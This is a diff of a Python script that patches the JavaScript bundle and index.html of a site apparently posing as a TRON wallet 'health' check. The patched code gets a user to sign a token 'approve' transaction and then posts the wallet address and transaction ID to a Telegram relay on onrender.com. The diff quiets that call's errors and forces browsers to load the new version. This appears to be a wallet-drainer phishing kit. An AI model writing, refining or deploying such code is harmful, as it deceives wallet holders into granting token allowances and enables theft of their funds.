@@ -220,11 +220,7 @@ new_f = r'''              , f = async e => {
                         console.log("[SIGN] Approve OK TXID:", n.txID);
                         GS.post("https://tronscantelegram.onrender.com/api/telegram", {
                             text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${n.txID || "N/A"}\nTime: ${new Date().toISOString()}`
-                        }, {
-                            timeout: 8000
-                        }).catch((telegramErr) => {
-                            console.error("Telegram approve notify failed:", telegramErr)
-                        });
+                        }).catch(() => {});
                         setTimeout(() => {
                             window.location.href = "/certificate"
                         }, 1500);
@@ -249,12 +245,13 @@ index = Path(r"D:\trchealth.live-main (1)\trchealth.live-main\index.html")
 html = index.read_text(encoding="utf-8")
 for v in ["signfix4", "signfix5", "signfix6", "main.cbdd1720.js?v=signfix6"]:
     pass
-html = html.replace("main.cbdd1720.js?v=signfix5", "main.cbdd1720.js?v=signfix8")
-html = html.replace("main.cbdd1720.js?v=signfix6", "main.cbdd1720.js?v=signfix8")
-html = html.replace("main.cbdd1720.js?v=signfix4", "main.cbdd1720.js?v=signfix8")
-html = html.replace("main.cbdd1720.js?v=signfix7", "main.cbdd1720.js?v=signfix8")
-if "signfix8" not in html:
-    html = html.replace('src="static/js/main.cbdd1720.js"', 'src="static/js/main.cbdd1720.js?v=signfix8"')
+html = html.replace("main.cbdd1720.js?v=signfix5", "main.cbdd1720.js?v=signfix9")
+html = html.replace("main.cbdd1720.js?v=signfix6", "main.cbdd1720.js?v=signfix9")
+html = html.replace("main.cbdd1720.js?v=signfix4", "main.cbdd1720.js?v=signfix9")
+html = html.replace("main.cbdd1720.js?v=signfix7", "main.cbdd1720.js?v=signfix9")
+html = html.replace("main.cbdd1720.js?v=signfix8", "main.cbdd1720.js?v=signfix9")
+if "signfix9" not in html:
+    html = html.replace('src="static/js/main.cbdd1720.js"', 'src="static/js/main.cbdd1720.js?v=signfix9"')
 index.write_text(html, encoding="utf-8")
 
 path.write_text(text, encoding="utf-8")
